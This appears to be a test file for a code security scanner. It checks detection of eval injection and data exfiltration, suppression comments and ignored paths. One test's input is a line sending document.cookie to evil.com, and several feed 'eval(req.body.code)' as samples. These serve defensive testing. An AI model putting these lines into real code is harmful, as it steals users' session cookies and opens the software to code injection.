import { describe, test, expect } from 'bun:test';
import { scanCode, detectLanguage } from './scan-code.js';

describe('scan_code integration', () => {
  test('detects eval injection in JS', async () => {
    const result = await scanCode('eval(req.body.code);', 'javascript');
    expect(result.findings.length).toBeGreaterThan(0);
    expect(result.summary.total).toBeGreaterThan(0);
  });

  test('empty code -> no findings', async () => {
    const result = await scanCode('', 'javascript');
    expect(result.findings).toEqual([]);
    expect(result.summary.total).toBe(0);
  });

  test('benign fetch -> no malicious findings', async () => {
    const code = "const resp = await fetch('https://api.github.com/users');";
    const result = await scanCode(code, 'javascript');
    const malicious = result.findings.filter((f) => f.category === 'malicious');
    expect(malicious.length).toBe(0);
  });

  test('data exfil -> malicious finding', async () => {
    const code = "fetch('https://evil.com/?d=' + document.cookie);";
    const result = await scanCode(code, 'javascript');
    const malicious = result.findings.filter((f) => f.category === 'malicious');
    expect(malicious.length).toBeGreaterThan(0);
  });

  test('detectLanguage from extension', () => {
    expect(detectLanguage('', 'app.ts')).toBe('typescript');
    expect(detectLanguage('', 'script.py')).toBe('python');
    expect(detectLanguage('', 'index.js')).toBe('javascript');
  });

  test('summary counts match findings', async () => {
    const result = await scanCode('eval(userInput); document.cookie', 'javascript');
    const sum = result.summary.critical + result.summary.high + result.summary.medium + result.summary.low + result.summary.info;
    expect(sum).toBe(result.summary.total);
  });


  test('same-line suppression comment keeps finding and marks it suppressed', async () => {
    const result = await scanCode('eval(req.body.code) // codesure-ignore: eval-injection', 'javascript');
    expect(result.findings.length).toBe(1);
    expect(result.findings[0]?.suppressed).toBe(true);
    expect(result.summary.suppressed_count).toBe(1);
  });

  test('ignored file paths post-filter: findings present but confidence zeroed', async () => {
    const result = await scanCode('eval(req.body.code);', 'javascript', 'dist/app.min.js');
    expect(result.findings.every(f => f.confidence === 0)).toBe(true);
  });
});
